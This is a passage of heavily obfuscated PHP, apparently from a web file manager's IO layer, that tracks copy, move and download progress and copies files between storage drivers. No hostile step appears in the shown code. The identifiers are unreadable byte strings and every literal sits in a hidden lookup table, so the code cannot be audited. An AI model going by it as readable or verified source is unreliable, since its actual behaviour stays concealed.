$Ÿ¢€ê´ˆ[1718])); Hook::bind($Ÿ¢€ê´ˆ[599], array($this, $Ÿ¢€ê´ˆ[1719])); Hook::bind($Ÿ¢€ê´ˆ[600], array($this, $Ÿ¢€ê´ˆ[1720])); Hook::bind($Ÿ¢€ê´ˆ[565], array($this, $Ÿ¢€ê´ˆ[1721])); Hook::bind($Ÿ¢€ê´ˆ[562], array($this, $Ÿ¢€ê´ˆ[1721])); Hook::bind($Ÿ¢€ê´ˆ[567], array($this, $Ÿ¢€ê´ˆ[1721])); Hook::bind($Ÿ¢€ê´ˆ[569], array($this, $Ÿ¢€ê´ˆ[1721])); Hook::bind($Ÿ¢€ê´ˆ[571], array($this, $Ÿ¢€ê´ˆ[1721])); Hook::bind($Ÿ¢€ê´ˆ[1722], array($this, $Ÿ¢€ê´ˆ[1723])); Hook::bind($Ÿ¢€ê´ˆ[587], array($this, $Ÿ¢€ê´ˆ[1724])); $this->sourceModelCopyFlag = !1; Hook::bind($Ÿ¢€ê´ˆ[1725], array($this, $Ÿ¢€ê´ˆ[1726])); Hook::bind($Ÿ¢€ê´ˆ[1727], array($this, $Ÿ¢€ê´ˆ[1728])); Hook::bind($Ÿ¢€ê´ˆ[1729], array($this, $Ÿ¢€ê´ˆ[1730])); $¯µ×Ù¥‘[$Ÿ¢€ê´ˆ[1731]] = LNG($Ÿ¢€ê´ˆ[1732]); $¯µ×Ù¥‘[$Ÿ¢€ê´ˆ[1733]] = 0; $¯µ×Ù¥‘[$Ÿ¢€ê´ˆ[1734]] = 0; $¯µ×Ù¥‘[$Ÿ¢€ê´ˆ[1077]] = $Ÿ¢€ê´ˆ[12]; $¯µ×Ù¥‘[$Ÿ¢€ê´ˆ[1735]] = $Ÿ¢€ê´ˆ[12]; $¯µ×Ù¥‘[$Ÿ¢€ê´ˆ[1736]] = 0; $¯µ×Ù¥‘[$Ÿ¢€ê´ˆ[1737]] = 0; $¯µ×Ù¥‘[$Ÿ¢€ê´ˆ[1738]] = 0; if (!$¯µ×Ù¥‘[$Ÿ¢€ê´ˆ[1580]]) { $¯µ×Ù¥‘[$Ÿ¢€ê´ˆ[1580]] = LNG($Ÿ¢€ê´ˆ[1739]); } } protected function endAfter() { $ô›Ìˆº =& $_SERVER[şÒÁøÒÄ]; Hook::unbind($ô›Ìˆº[1710], array($this, $ô›Ìˆº[1711])); Hook::unbind($ô›Ìˆº[1236], array($this, $ô›Ìˆº[1712])); Hook::unbind($ô›Ìˆº[1713], array($this, $ô›Ìˆº[1714])); Hook::unbind($ô›Ìˆº[596], array($this, $ô›Ìˆº[1715])); Hook::unbind($ô›Ìˆº[597], array($this, $ô›Ìˆº[1716])); Hook::unbind($ô›Ìˆº[602], array($this, $ô›Ìˆº[1717])); Hook::unbind($ô›Ìˆº[603], array($this, $ô›Ìˆº[1718])); Hook::unbind($ô›Ìˆº[599], array($this, $ô›Ìˆº[1719])); Hook::unbind($ô›Ìˆº[600], array($this, $ô›Ìˆº[1720])); Hook::unbind($ô›Ìˆº[565], array($this, $ô›Ìˆº[1721])); Hook::unbind($ô›Ìˆº[562], array($this, $ô›Ìˆº[1721])); Hook::unbind($ô›Ìˆº[567], array($this, $ô›Ìˆº[1721])); Hook::unbind($ô›Ìˆº[569], array($this, $ô›Ìˆº[1721])); Hook::unbind($ô›Ìˆº[571], array($this, $ô›Ìˆº[1721])); Hook::unbind($ô›Ìˆº[1722], array($this, $ô›Ìˆº[1723])); Hook::unbind($ô›Ìˆº[587], array($this, $ô›Ìˆº[1724])); Hook::unbind($ô›Ìˆº[1725], array($this, $ô›Ìˆº[1726])); Hook::unbind($ô›Ìˆº[1727], array($this, $ô›Ìˆº[1728])); Hook::unbind($ô›Ìˆº[1729], array($this, $ô›Ìˆº[1730])); } public function copyMoveStart($­À°ÀÖ, $üæÊµè, $‡ÚîêûĞ, $è÷ğâÈŠ) { $ç¡¤²ûş =& $_SERVER[şÒÁøÒÄ]; self::log($ç¡¤²ûş[1740] . $üæÊµè . $ç¡¤²ûş[70] . $è÷ğâÈŠ); $ˆçôñº¯ = rtrim(TEMP_FILES, $ç¡¤²ûş[8]); if (substr($üæÊµè, 0, strlen($ˆçôñº¯)) == $ˆçôñº¯) { return; } if (substr($è÷ğâÈŠ, 0, strlen($ˆçôñº¯)) == $ˆçôñº¯) { return; } $×ÉŸÓÙÒ =& $this->task; $×ÉŸÓÙÒ[$ç¡¤²ûş[1741]] = KodIO::transferType($­À°ÀÖ, $‡ÚîêûĞ); $this->update(); } public function updateAfter() { $§ÅéËİ =& $_SERVER[şÒÁøÒÄ]; $Ãñ¹ ¼€ =& $this->task; if (!$Ãñ¹ ¼€[$§ÅéËİ[771]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($Ãñ¹ ¼€[$§ÅéËİ[1741]] == $§ÅéËİ[1325]) { return; } self::updateTask($Ãñ¹ ¼€); } private static function updateTask(&$Òö…ùˆ®) { $ò×âî¹« =& $_SERVER[şÒÁøÒÄ]; if ($Òö…ùˆ®[$ò×âî¹«[1741]] == $ò×âî¹«[1207] || $Òö…ùˆ®[$ò×âî¹«[1741]] == $ò×âî¹«[107]) { if ($Òö…ùˆ®[$ò×âî¹«[1735]]) { $Òö…ùˆ®[$ò×âî¹«[1738]] = $Òö…ùˆ®[$ò×âî¹«[1737]] + $Òö…ùˆ®[$ò×âî¹«[1734]]; } } else { if ($Òö…ùˆ®[$ò×âî¹«[1741]] == $ò×âî¹«[1326]) { if ($Òö…ùˆ®[$ò×âî¹«[1735]] == $ò×âî¹«[1207]) { $Òö…ùˆ®[$ò×âî¹«[1738]] = $Òö…ùˆ®[$ò×âî¹«[1737]] + $Òö…ùˆ®[$ò×âî¹«[1734]] * 0.5; } else { if ($Òö…ùˆ®[$ò×âî¹«[1735]] == $ò×âî¹«[107]) { $Òö…ùˆ®[$ò×âî¹«[1738]] = $Òö…ùˆ®[$ò×âî¹«[1737]] + $Òö…ùˆ®[$ò×âî¹«[1733]] * 0.5 + $Òö…ùˆ®[$ò×âî¹«[1734]] * 0.5; } } } } $Òö…ùˆ®[$ò×âî¹«[1682]] = $Òö…ùˆ®[$ò×âî¹«[1738]] / $Òö…ùˆ®[$ò×âî¹«[771]]; if ($Òö…ùˆ®[$ò×âî¹«[1682]] > 0) { $áåÇ÷£Ç = timeFloat() - $Òö…ùˆ®[$ò×âî¹«[1684]] - $Òö…ùˆ®[$ò×âî¹«[1687]]; $Òö…ùˆ®[$ò×âî¹«[1688]] = $áåÇ÷£Ç * (1 - $Òö…ùˆ®[$ò×âî¹«[1682]]) / $Òö…ùˆ®[$ò×âî¹«[1682]]; } } public function addPath($Õ•ÀÔ¸‡) { $ÔÒìúË¥ =& $_SERVER[şÒÁøÒÄ]; if (!$Õ•ÀÔ¸‡) { return; } $ˆáİĞ­ü =& $this->task; $÷ÏËéõû = IO::infoWithChildren($Õ•ÀÔ¸‡); $©÷—É‹ª = $ˆáİĞ­ü[$ÔÒìúË¥[1742]] ? $ˆáİĞ­ü[$ÔÒìúË¥[1742]][$ÔÒìúË¥[1743]] : 0; $ˆáİĞ­ü[$ÔÒìúË¥[1742]] = array($ÔÒìúË¥[1743] => $©÷—É‹ª + 1, $ÔÒìúË¥[420] => $÷ÏËéõû[$ÔÒìúË¥[32]], $ÔÒìúË¥[84] => $÷ÏËéõû[$ÔÒìúË¥[84]], $ÔÒìúË¥[509] => $÷ÏËéõû[$ÔÒìúË¥[509]] ? $÷ÏËéõû[$ÔÒìúË¥[509]] : $÷ÏËéõû[$ÔÒìúË¥[84]]); if ($÷ÏËéõû[$ÔÒìúË¥[33]] == $ÔÒìúË¥[200]) { $ˆáİĞ­ü[$ÔÒìúË¥[794]] += 1; } else { $ˆáİĞ­ü[$ÔÒìúË¥[794]] += $÷ÏËéõû[$ÔÒìúË¥[79]][$ÔÒìúË¥[77]]; if ($÷ÏËéõû[$ÔÒìúË¥[402]]) { $ˆáİĞ­ü[$ÔÒìúË¥[794]] += $÷ÏËéõû[$ÔÒìúË¥[79]][$ÔÒìúË¥[78]] + 1; } } $ˆáİĞ­ü[$ÔÒìúË¥[771]] += $÷ÏËéõû[$ÔÒìúË¥[76]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($âÕš–İ‡) { } public function sourceAddHashEnd($©çØùšõ) { } public function sourceAddFileStart($ÜšÅ«ÒÎ) { $ùÛ­¿¡¦ =& $_SERVER[şÒÁøÒÄ]; $Ö‰ªÄ±ù =& $this->task; $Ö‰ªÄ±ù[$ùÛ­¿¡¦[1733]] = $ÜšÅ«ÒÎ[$ùÛ­¿¡¦[76]]; $Ö‰ªÄ±ù[$ùÛ­¿¡¦[1731]] = $ÜšÅ«ÒÎ[$ùÛ­¿¡¦[32]]; $Ö‰ªÄ±ù[$ùÛ­¿¡¦[1077]] = $ÜšÅ«ÒÎ[$ùÛ­¿¡¦[32]]; $Ö‰ªÄ±ù[$ùÛ­¿¡¦[1744]] = $ÜšÅ«ÒÎ[$ùÛ­¿¡¦[84]]; $this->update(); } public function sourceAddFileEnd($µé·¾‰) { $×õµ¶ß¬ =& $_SERVER[şÒÁøÒÄ]; $Ùˆùë†‰ =& $this->task; $Ùˆùë†‰[$×õµ¶ß¬[1738]] += $µé·¾‰[$×õµ¶ß¬[76]]; $Ùˆùë†‰[$×õµ¶ß¬[1744]] = $µé·¾‰[$×õµ¶ß¬[84]]; $this->update(1); } public function copyFileStart($Çœ±¯şÓ, $³€ÉÌß, $¼ÏÇŞÅ, $›´Æ»Ã, $ïıÔÚİÇ, $•¦´¨ş) { $é•õ±Å =& $_SERVER[şÒÁøÒÄ]; $¦æŠî ¤ = $ïıÔÚİÇ; if ($¦æŠî ¤ == $GLOBALS[$é•õ±Å[1745]]) { $¦æŠî ¤ = $GLOBALS[$é•õ±Å[1746]]; } $GLOBALS[$é•õ±Å[1746]] = $ïıÔÚİÇ; $GLOBALS[$é•õ±Å[1745]] = $•¦´¨ş; $›¨˜° =& $this->task; $›¨˜°[$é•õ±Å[1731]] = $¦æŠî ¤; $›¨˜°[$é•õ±Å[1733]] = (int) $Çœ±¯şÓ->size($³€ÉÌß); $›¨˜°[$é•õ±Å[1734]] = 0; $›¨˜°[$é•õ±Å[1077]] = $é•õ±Å[12]; $›¨˜°[$é•õ±Å[1735]] = $é•õ±Å[12]; $›¨˜°[$é•õ±Å[1736]] = 0; $Êê¢³à = $›¨˜°[$é•õ±Å[1733]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($›¨˜°[$é•õ±Å[399]] . $é•õ±Å[1747]); if ($Êê¢³à && file_exists(get_path_father($›´Æ»Ã))) { Cache::set($›¨˜°[$é•õ±Å[399]] . $é•õ±Å[1747], $›´Æ»Ã); $›¨˜°[$é•õ±Å[1704]] = array($é•õ±Å[1748], $é•õ±Å[1749]); } $this->update(0, $Êê¢³à); } public static function updateCopyLocalFileSize($Ú¦„ıµõ) { $ö·ÄÚ¥¼ =& $_SERVER[şÒÁøÒÄ]; $åëÅöÀ = Cache::get($Ú¦„ıµõ[$ö·ÄÚ¥¼[399]] . $ö·ÄÚ¥¼[1747]); if (!$åëÅöÀ || !file_exists($åëÅöÀ)) { return $Ú¦„ıµõ; } $Ú¦„ıµõ[$ö·ÄÚ¥¼[1734]] = @filesize($åëÅöÀ); $Ú¦„ıµõ[$ö·ÄÚ¥¼[1738]] += $Ú¦„ıµõ[$ö·ÄÚ¥¼[1734]]; self::updateTask($Ú¦„ıµõ); return $Ú¦„ıµõ; } public function copyFileEnd($Á¾¾‰«‡, $ë‚ŞÈš‹, $ “ŠÛŒ§, $ÌøÏØ‚³, $ÈÁ‡§Ã, $íõìïåİ) { $Æá»ÚÉ =& $_SERVER[şÒÁøÒÄ]; $·Í¬è§‡ =& $this->task; $·Í¬è§‡[$Æá»ÚÉ[1734]] = $·Í¬è§‡[$Æá»ÚÉ[1733]]; $·Í¬è§‡[$Æá»ÚÉ[1735]] = $Æá»ÚÉ[12]; unset($·Í¬è§‡[$Æá»ÚÉ[1704]]); if ($ÈÁ‡§Ã == $·Í¬è§‡[$Æá»ÚÉ[1731]]) { $·Í¬è§‡[$Æá»ÚÉ[1737]] += $·Í¬è§‡[$Æá»ÚÉ[1733]]; $·Í¬è§‡[$Æá»ÚÉ[1738]] = $·Í¬è§‡[$Æá»ÚÉ[1737]]; $½ˆÓ˜ü = 1; if (isset($·Í¬è§‡[$Æá»ÚÉ[1744]]) && $·Í¬è§‡[$Æá»ÚÉ[1744]] == $ë‚ŞÈš‹) { $½ˆÓ˜ü = 0; } $this->update($½ˆÓ˜ü); } else { $this->update(); $·Í¬è§‡[$Æá»ÚÉ[1734]] = 0; } Cache::remove($·Í¬è§‡[$Æá»ÚÉ[399]] . $Æá»ÚÉ[1747]); self::log($Æá»ÚÉ[1750] . $ë‚ŞÈš‹ . $Æá»ÚÉ[70] . $ÌøÏØ‚³ . $Æá»ÚÉ[231] . $ÈÁ‡§Ã . $Æá»ÚÉ[1751] . $·Í¬è§‡[$Æá»ÚÉ[1731]]); } public function updateFileEnd($ãÍ»ííÕ, $èÓ‰ÃÕÒ) { $òü±·°Ã =& $_SERVER[şÒÁøÒÄ]; $¦“ûÉëŒ =& $this->task; $¦“ûÉëŒ[$òü±·°Ã[1731]] = $ãÍ»ííÕ; $¦“ûÉëŒ[$òü±·°Ã[1733]] = $èÓ‰ÃÕÒ; $¦“ûÉëŒ[$òü±·°Ã[1737]] += $èÓ‰ÃÕÒ; $¦“ûÉëŒ[$òü±·°Ã[1738]] = $¦“ûÉëŒ[$òü±·°Ã[1737]]; $this->update(1); self::log($òü±·°Ã[1752] . $ãÍ»ííÕ); } public function sourceModelCopy($ÅÇâÈú) { $‡¯–ù‚Œ =& $_SERVER[şÒÁøÒÄ]; $ôô“Í–É = $ÅÇâÈú[0]; $ãÀ£çî = $ÅÇâÈú[1]; $èı»ıßœ =& $this->task; $this->sourceModelCopyFlag = !0; $Õ©Òç ‰ = 0; switch ($ôô“Í–É) { case $‡¯–ù‚Œ[563]: $Õ©Òç ‰ = 1; break; case $‡¯–ù‚Œ[566]: $èı»ıßœ[$‡¯–ù‚Œ[1731]] = $ãÀ£çî[$‡¯–ù‚Œ[32]]; break; case $‡¯–ù‚Œ[568]: $Õ©Òç ‰ = intval($ÅÇâÈú[$‡¯–ù‚Œ[380]] * 0.4); break; case $‡¯–ù‚Œ[570]: $Õ©Òç ‰ = intval($ÅÇâÈú[$‡¯–ù‚Œ[380]] * 0.2); break; case $‡¯–ù‚Œ[572]: $Õ©Òç ‰ = intval($ÅÇâÈú[$‡¯–ù‚Œ[380]] * 0.4); break; } $this->update($Õ©Òç ‰); $this->sourceModelCopyFlag = !1; } public function sourceRemove($êèÌ”º, $Š¾ù€Óô) { $³ÎæÂ±ş =& $_SERVER[şÒÁøÒÄ]; $this->sourceModelCopyFlag = !0; $Úè–®‡Æ = 1; if (isset($êèÌ”º[$³ÎæÂ±ş[79]])) { $Úè–®‡Æ = $êèÌ”º[$³ÎæÂ±ş[79]][$³ÎæÂ±ş[77]]; $Úè–®‡Æ = $Úè–®‡Æ + $êèÌ”º[$³ÎæÂ±ş[79]][$³ÎæÂ±ş[78]] + 1; } $this->update($Úè–®‡Æ); $this->sourceModelCopyFlag = !1; } public function sourceMove($ªâîÂıü) { $this->sourceRemove($ªâîÂıü, !1); } public function curlProgress($Õ¯›Öì…, $Äè©Ÿ›à, $ÆÄÈË²–, $ÚÖğğØô, $ÙĞÁâ) { $©×æ¥ßÍ =& $_SERVER[şÒÁøÒÄ]; $Õ¥­½ŠĞ =& $this->task; if ($ÙĞÁâ > 0) { $Õ¥­½ŠĞ[$©×æ¥ßÍ[1077]] = $©×æ¥ßÍ[1753]; $Õ¥­½ŠĞ[$©×æ¥ßÍ[1735]] = $©×æ¥ßÍ[107]; if ($Õ¥­½ŠĞ[$©×æ¥ßÍ[1733]]) { $Õ¥­½ŠĞ[$©×æ¥ßÍ[1734]] = $ÙĞÁâ; } if ($Õ¥­½ŠĞ[$©×æ¥ßÍ[1736]]) { $Õ¥­½ŠĞ[$©×æ¥ßÍ[1734]] = $ÙĞÁâ + $Õ¥­½ŠĞ[$©×æ¥ßÍ[1736]]; } } else { if ($ÆÄÈË²– > 0) { if ($Õ¥­½ŠĞ[$©×æ¥ßÍ[1733]] == $Äè©Ÿ›à) { $Õ¥­½ŠĞ[$©×æ¥ßÍ[1734]] = $ÆÄÈË²–; $Õ¥­½ŠĞ[$©×æ¥ßÍ[1077]] = $©×æ¥ßÍ[1754]; $Õ¥­½ŠĞ[$©×æ¥ßÍ[1735]] = $©×æ¥ßÍ[1207]; } } } $this->update(); } public function curlProgressStart($¤ºÓ÷Æ…) { } public function curlProgressEnd($Ì¿œ…İ) { $„ÅÅë«  =& $_SERVER[şÒÁøÒÄ]; $ó£‚ØÓÔ =& $this->task; $‹åºì· = curl_getinfo($Ì¿œ…İ); $ä…¼İÜ¡ = $‹åºì·[$„ÅÅë« [1755]]; if ($ä…¼İÜ¡ == -1) { $ä…¼İÜ¡ = $‹åºì·[$„ÅÅë« [1756]]; } if ($ó£‚ØÓÔ[$„ÅÅë« [1735]] == $„ÅÅë« [107] && $ä…¼İÜ¡) { $ó£‚ØÓÔ[$„ÅÅë« [1736]] += $ä…¼İÜ¡; } $this->update(); } } goto dØ²±°‚™ì; bĞĞÎš ¹Æ: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($ãµÒ±Ù¬, $º¸Åš‰¦) { $×Ñ›£Ï =& $_SERVER[şÒÁøÒÄ]; $¾µÜÜ = $º¸Åš‰¦; $GLOBALS[$×Ñ›£Ï[1159]] = $×Ñ›£Ï[1160] . $ãµÒ±Ù¬; Hook::trigger($×Ñ›£Ï[1160] . $ãµÒ±Ù¬ . $×Ñ›£Ï[1161], $¾µÜÜ); $–²Ôœ§Ä = self::driverMake($º¸Åš‰¦[0]); if (!$–²Ôœ§Ä) { return !1; } if (method_exists($–²Ôœ§Ä, $ãµÒ±Ù¬)) { $ê¢Å¨øœ = @call_user_func_array(array($–²Ôœ§Ä, $ãµÒ±Ù¬), $º¸Åš‰¦); } else { if (method_exists($–²Ôœ§Ä, $×Ñ›£Ï[1162])) { $ê¢Å¨øœ = @call_user_func_array(array($–²Ôœ§Ä, $ãµÒ±Ù¬), $º¸Åš‰¦); } else { if (method_exists(self, $ãµÒ±Ù¬)) { $ê¢Å¨øœ = @call_user_func_array(array(self, $ãµÒ±Ù¬), $º¸Åš‰¦); } else { $ê¢Å¨øœ = call_user_func_array(array(parent, $ãµÒ±Ù¬), $º¸Åš‰¦); } } } Hook::trigger($×Ñ›£Ï[1160] . $ãµÒ±Ù¬ . $×Ñ›£Ï[1163], $¾µÜÜ, $ê¢Å¨øœ); return $ê¢Å¨øœ; } public static function init($‰ãïÂ†È) { return self::driverMake($‰ãïÂ†È); } public static function copy($ß¿à”ÖĞ, $ãĞı¼’Ò, $íêÊŸ¸— = false, $ƒÜ˜ = false) { return self::copyMoveStart($ß¿à”ÖĞ, $ãĞı¼’Ò, $íêÊŸ¸—, $_SERVER[şÒÁøÒÄ][546], $ƒÜ˜); } public static function move($¹Á’ğü, $À¡•‘”¬, $„„„Òñ— = false, $à¢åŒ¾ï = false) { return self::copyMoveStart($¹Á’ğü, $À¡•‘”¬, $„„„Òñ—, $_SERVER[şÒÁøÒÄ][548], $à¢åŒ¾ï); } private static function copyMoveStart($—ØÊ£¤Â, $ôÁİÔ¼, $è½¨Œ¤á, $—Ş˜‰œÎ, $“²ùæˆË) { $™—øİĞƒ =& $_SERVER[şÒÁøÒÄ]; $ŒÏÙ¢Íº = array($—ØÊ£¤Â, $ôÁİÔ¼, $è½¨Œ¤á, $“²ùæˆË); Hook::trigger($™—øİĞƒ[1160] . $—Ş˜‰œÎ . $™—øİĞƒ[1161], $ŒÏÙ¢Íº); $×Ö»¹Øë = self::copyMove($—ØÊ£¤Â, $ôÁİÔ¼, $è½¨Œ¤á, $—Ş˜‰œÎ, $“²ùæˆË); Hook::trigger($™—øİĞƒ[1160] . $—Ş˜‰œÎ . $™—øİĞƒ[1163], $ŒÏÙ¢Íº, $×Ö»¹Øë); return $×Ö»¹Øë; } public static function saveFile($´³öœÈ©, $™òçŒ‡, $é¤ïµ´ = true) { $‚•ãòñº =& $_SERVER[şÒÁøÒÄ]; $ÉÈš¢ãÀ = self::info($™òçŒ‡); $ËŸÓ¡ = self::driverMake($´³öœÈ©); $˜ËçŸöÔ = self::driverMake($™òçŒ‡); $¹ô§Ú´‘ = !1; if ($˜ËçŸöÔ->pathParse[$‚•ãòñº[1164]]) { $¹ô§Ú´‘ = $˜ËçŸöÔ; $Ø¡Ûµîñ = $˜ËçŸöÔ->pathParse[$‚•ãòñº[1164]]; $˜ËçŸöÔ = self::driverMake($Ø¡Ûµîñ); } if ($ËŸÓ¡->pathParse[$‚•ãòñº[1164]]) { $™Í©«¤§ = $ËŸÓ¡->pathParse[$‚•ãòñº[1164]]; $ËŸÓ¡ = self::driverMake($™Í©«¤§); } $“ùÒá¤œ = $˜ËçŸöÔ->pathFather($™òçŒ‡); $Ÿóºå»â = !0; if (!$é¤ïµ´ && self::driverIsSame($ËŸÓ¡, $˜ËçŸöÔ)) { $Ÿóºå»â = !1; } $÷÷ç¬›° = self::copyFile($ËŸÓ¡, $´³öœÈ©, $˜ËçŸöÔ, $“ùÒá¤œ, $ÉÈš¢ãÀ[$‚•ãòñº[32]], $Ÿóºå»â); if ($¹ô§Ú´‘) { $÷÷ç¬›° = $¹ô§Ú´‘->getPathOuter($÷÷ç¬›°); } return $÷÷ç¬›°; } private static function copyMove($À¶Ò˜¼ú, $¡Ö­ºñ…, $É™˜³ş•, $ª§Êù¹¨, $«€è‡Ê = false) { $à»îŠ—¢ =& $_SERVER[şÒÁøÒÄ]; if (!$À¶Ò˜¼ú || $À¶Ò˜¼ú == $à»îŠ—¢[8] || !$¡Ö­ºñ…) { return !1; } ignore_timeout(); $Åóè…‰Ë = self::driverMake($À¶Ò˜¼ú); $Õ£úç¥ã = self::driverMake($¡Ö­ºñ…); $¤´İíÎ¼ = $ª§Êù¹¨ == $à»îŠ—¢[548]; $Ì€Íò = !1; if ($Õ£úç¥ã->pathParse[$à»îŠ—¢[1164]]) { $Ì€Íò = $Õ£úç¥ã; $¡Ö­ºñ… = $Õ£úç¥ã->pathParse[$à»îŠ—¢[1164]]; $Õ£úç¥ã = self::driverMake($¡Ö­ºñ…); } if ($Åóè…‰Ë->pathParse[$à»îŠ—¢[1164]]) { $À¶Ò˜¼ú = $Åóè…‰Ë->pathParse[$à»îŠ—¢[1164]]; $Åóè…‰Ë = self::driverMake($À¶Ò˜¼ú); } self::check($Åóè…‰Ë, $À¶Ò˜¼ú, $Õ£úç¥ã, $¡Ö­ºñ…); Hook::trigger($à»îŠ—¢[1165], $Åóè…‰Ë, $À¶Ò˜¼ú, $Õ£úç¥ã, $¡Ö­ºñ…); $¤ºø’ = self::driverIsSame($Åóè…‰Ë, $Õ£úç¥ã); if ($¤ºø’) { if ($ª§Êù¹¨ == $à»îŠ—¢[548] && !method_exists($Õ£úç¥ã, $à»îŠ—¢[1166]) && trim($¡Ö­ºñ…, $à»îŠ—¢[8]) == trim($Õ£úç¥ã->pathFather($À¶Ò˜¼ú), $à»îŠ—¢[8])) { if ($Åóè…‰Ë->pathThis($À¶Ò˜¼ú) != $«€è‡Ê && !$Åóè…‰Ë->isTypeObject()) { return $Åóè…‰Ë->rename($À¶Ò˜¼ú, $«€è‡Ê); } return $Õ£úç¥ã->getPathOuter($À¶Ò˜¼ú); } if (method_exists($Õ£úç¥ã, $ª§Êù¹¨)) { return $Õ£úç¥ã->{$ª§Êù¹¨}($À¶Ò˜¼ú, $¡Ö­ºñ…, $É™˜³ş•, $«€è‡Ê); } } if ($¤ºø’ && $ª§Êù¹¨ == $à»îŠ—¢[548] && $Õ£úç¥ã->getType() == $à»îŠ—¢[106]) { $ÁÁ‘¢ïÚ = $Õ£úç¥ã->movePath($À¶Ò˜¼ú, $¡Ö­ºñ…, $«€è‡Ê); if ($ÁÁ‘¢ïÚ) { return $ÁÁ‘¢ïÚ; } } $º½ª¹ä = $Åóè…‰Ë->isFile($À¶Ò˜¼ú); if (!$º½ª¹ä && $Õ£úç¥ã->getType() == $à»îŠ—¢[765] && $Åóè…‰Ë->getType() == $à»îŠ—¢[106]) { $ÁÁ‘¢ïÚ = $Õ£úç¥ã->copyFolderFromIO($Åóè…‰Ë, $À¶Ò˜¼ú, $¡Ö­ºñ…, $É™˜³ş•, $¤´İíÎ¼, $«€è‡Ê); } else { $ÁÁ‘¢ïÚ = self::copyPath($Åóè…‰Ë, $À¶Ò˜¼ú, $Õ£úç¥ã, $¡Ö­ºñ…, $É™˜³ş•, $¤´İíÎ¼, $º½ª¹ä, $«€è‡Ê); } if ($ÁÁ‘¢ïÚ && $¤´İíÎ¼) { $Åóè…‰Ë->remove($À¶Ò˜¼ú); } if ($Ì€Íò) { $ÁÁ‘¢ïÚ = $Ì€Íò->getPathOuter($ÁÁ‘¢ïÚ); } return $ÁÁ‘¢ïÚ; } private static function check($†¿€åñí, $—ßºÏ‡æ, $¼…¢±ôÍ, &$°÷ªàƒÉ) { $á®Ÿ˜ÀÙ =& $_SERVER[şÒÁøÒÄ]; if (self::driverIsSame($†¿€åñí, $¼…¢±ôÍ) && $†¿€åñí->isFolder($—ßºÏ‡æ) && $†¿€åñí->isParentOf($—ßºÏ‡æ, $°÷ªàƒÉ)) { show_json(LNG($á®Ÿ˜ÀÙ[1167]), !1); } if (!$†¿€åñí->exist($—ßºÏ‡æ)) { show_json(LNG($á®Ÿ˜ÀÙ[105]), !1); } } private static function copyPath($¤Ã±ˆ«Í, $‰‘ÒÉ, $Âº†½÷Ç, $ò°òş¼Ğ, $ÅÍæµ¥€, $–„ÑÊÈì, $ıß‰„·ı, $Ù¢ğÜèø = false, $µĞ®¤øü = true) { $õ»•ÇıÂ =& $_SERVER[şÒÁøÒÄ]; $ŸÖí‡ê‘ = empty($Ù¢ğÜèø) && $Ù¢ğÜèø !== $õ»•ÇıÂ[198] ? $¤Ã±ˆ«Í->pathThis($‰‘ÒÉ) : $Ù¢ğÜèø; if ($ÅÍæµ¥€) { $¼šÒ¨å“ = $Âº†½÷Ç->fileNameExist($ò°òş¼Ğ, $ŸÖí‡ê‘); $ÍâÚœ´˜ = $ŸÖí‡ê‘; $ŸÖí‡ê‘ = $Âº†½÷Ç->fileNameAuto($ò°òş¼Ğ, $ŸÖí‡ê‘, $ÅÍæµ¥€, !$ıß‰„·ı); if (!$¼šÒ¨å“ || $ÍâÚœ´˜ != $ŸÖí‡ê‘) { $ÅÍæµ¥€ = !1; } if ($µĞ®¤øü && !$ÅÍæµ¥€) { $Âº†½÷Ç->_data[$õ»•ÇıÂ[1168]] = !0; } } if ($ıß‰„·ı) { return self::copyFile($¤Ã±ˆ«Í, $‰‘ÒÉ, $Âº†½÷Ç, $ò°òş¼Ğ, $ŸÖí‡ê‘, $–„ÑÊÈì); } if ($ÅÍæµ¥€ == REPEAT_RENAME_FOLDER) { $ÅÍæµ¥€ = !1; } $Ì–Ÿßü = rtrim($ò°òş¼Ğ, $õ»•ÇıÂ[8]) . $õ»•ÇıÂ[8] . $ŸÖí‡ê‘; $ñßÔ‘Åı = $Âº†½÷Ç->mkdir($Âº†½÷Ç->getPath($Ì–Ÿßü), $ÅÍæµ¥€); $ò°òş¼Ğ = $Âº†½÷Ç->getPathInner($ñßÔ‘Åı); $ò”¿œÔø = $¤Ã±ˆ«Í->listPath($‰‘ÒÉ, !0); $ò”¿œÔø = is_array($ò”¿œÔø) ? $ò”¿œÔø : array($õ»•ÇıÂ[83] => array(), $õ»•ÇıÂ[82] => array()); $ôÒÛé– = array_merge($ò”¿œÔø[$õ»•ÇıÂ[83]], $ò”¿œÔø[$õ»•ÇıÂ[82]]); foreach ($ôÒÛé– as $ôñŒ®ï¸) { $¨Á‰´“Ø = $ôñŒ®ï¸[$õ»•ÇıÂ[33]] == $õ»•ÇıÂ[200]; $‰‘ÒÉ = $¤Ã±ˆ«Í->getPathInner($ôñŒ®ï¸[$õ»•ÇıÂ[84]]); $»îĞ¥§ = self::copyPath($¤Ã±ˆ«Í, $‰‘ÒÉ, $Âº†½÷Ç, $ò°òş¼Ğ, $ÅÍæµ¥€, $–„ÑÊÈì, $¨Á‰´“Ø, !1, !1); if (!$»îĞ¥§) { IO::errorTips($õ»•ÇıÂ[1169] . $‰‘ÒÉ . $õ»•ÇıÂ[70] . $ò°òş¼Ğ); } } self::copyMoveKeepInfo($¤Ã±ˆ«Í, $‰‘ÒÉ, $ñßÔ‘Åı); return $ñßÔ‘Åı; } private static function copyFile($çËç„şˆ, $‘ÜÍ¬ƒ“, $¡‘“‡É–, $Çİ‰ÒŠ, $ô“Ä»‡ş, $ÏŸŠ·˜Ğ) { $°¢«¥Áì =& $_SERVER[şÒÁøÒÄ]; $Çİ‰ÒŠ = $¡‘“‡É–->getPath(rtrim($Çİ‰ÒŠ, $°¢«¥Áì[8]) . $°¢«¥Áì[8] . $ô“Ä»‡ş); $ø•Œªµî = $°¢«¥Áì[1170] . time() . rand_string(5); Hook::trigger($°¢«¥Áì[1171], $çËç„şˆ, $‘ÜÍ¬ƒ“, $¡‘“‡É–, $Çİ‰ÒŠ, $ô“Ä»‡ş, $ø•Œªµî); if (self::driverIsSame($çËç„şˆ, $¡‘“‡É–)) { if ($ÏŸŠ·˜Ğ) { $íßï³Ê÷ = $¡‘“‡É–->moveFile($‘ÜÍ¬ƒ“, 